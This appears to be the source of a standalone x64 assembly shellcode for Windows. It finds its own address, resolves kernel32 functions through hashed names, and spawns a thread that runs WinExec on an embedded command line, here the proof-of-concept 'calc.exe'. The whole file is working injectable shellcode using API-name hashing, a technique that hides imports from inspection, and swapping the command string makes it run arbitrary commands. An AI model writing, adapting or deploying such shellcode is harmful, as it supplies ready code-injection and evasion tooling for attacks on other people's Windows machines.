[ORG 0]
[BITS 64]

entry:
  ; store context
  push rbx                              ; store rbx
  cld                                   ; clear the direction flag

  ; calculate entry address
  call calc_entry_addr                  ; calculate the entry address
  flag_CEA:                             ; flag for calculate entry address

  ; reserve stack for arguments
  sub rsp, 6*8

  ; call "kernel32.dll, CreateThread"
  mov rcx, 0xD663A89A079E0973           ; set module name hash
  mov rdx, 0xB05BCF369A573601           ; set procedure name hash
  mov r8,  0xE9C877DEE6BFE924           ; set hash key
  mov r9,  6                            ; set num arguments

  lea r10, [rbx+win_exec]               ; calculate function address
  xor rax, rax                          ; for set zero argument
  mov [rsp+0*8], rax                    ; lpThreadAttributes
  mov [rsp+1*8], rax                    ; dwStackSize
  mov [rsp+2*8], r10                    ; lpStartAddress
  mov [rsp+3*8], rbx                    ; lpParameter, set entry address
  mov [rsp+4*8], rax                    ; dwCreationFlags
  mov [rsp+5*8], rax                    ; lpThreadId

  sub rsp, 32                           ; reserve stack
  call api_call                         ; call api function
  add rsp, 32                           ; restore stack

  ; call "kernel32.dll, WaitForSingleObject"
  mov rcx, 0x5C1EE9B9874351C7           ; set module name hash
  mov rdx, 0x43B95AAF1ACA1E9B           ; set procedure name hash
  mov r8,  0x9A7B1560D76B5B73           ; set hash key
  mov r9,  2                            ; set num arguments

  mov r10, 1000                         ; set dwMilliseconds
  mov [rsp+0*8], rax                    ; thread handle
  mov [rsp+1*8], r10                    ; dwMilliseconds

  sub rsp, 32                           ; reserve stack
  call api_call                         ; call api function
  add rsp, 32                           ; restore stack

  ; restore stack for arguments
  add rsp, 6*8

  ; restore context
  pop rbx                               ; restore rbx
  ret                                   ; return to the caller

; calculate shellcode entry address
calc_entry_addr:
  pop rax                               ; get return address
  lea rbx, [rax-flag_CEA]               ; calculate entry address
  push rax                              ; push return address
  ret                                   ; return to entry

win_exec:
  ; store context
  push rbx                              ; store rbx
  mov rbx, rcx                          ; read entry address from rcx
  cld                                   ; clear the direction flag

  ; reserve stack for arguments
  sub rsp, 2*8

  ; call "kernel32.dll, WinExec"
  mov rcx, 0x9BAC085EFA4FDFAE           ; set module name hash
  mov rdx, 0x221840B185A6EC3D           ; set procedure name hash
  mov r8,  0xCAF4D6F05577E596           ; set hash key
  mov r9,  2                            ; set num arguments

  lea r10, [rbx+cmd_line]               ; lpCmdLine
  mov [rsp+0], r10                      ; move argument to stack
  xor r10, r10                          ; clear r10
  mov r10b, [rbx+cmd_show]              ; uCmdShow
  mov [rsp+8], r10                      ; move argument to stack

  sub rsp, 32                           ; reserve stack
  call api_call                         ; call api function
  add rsp, 32                           ; restore stack

  ; restore stack for arguments
  add rsp, 2*8

  ; restore context
  pop rbx                               ; restore rbx
  ret                                   ; exit thread

hash_api:
  %include "src/x64/api_call.asm"

cmd_line:
  db "calc.exe", 0

cmd_show:
  db 1
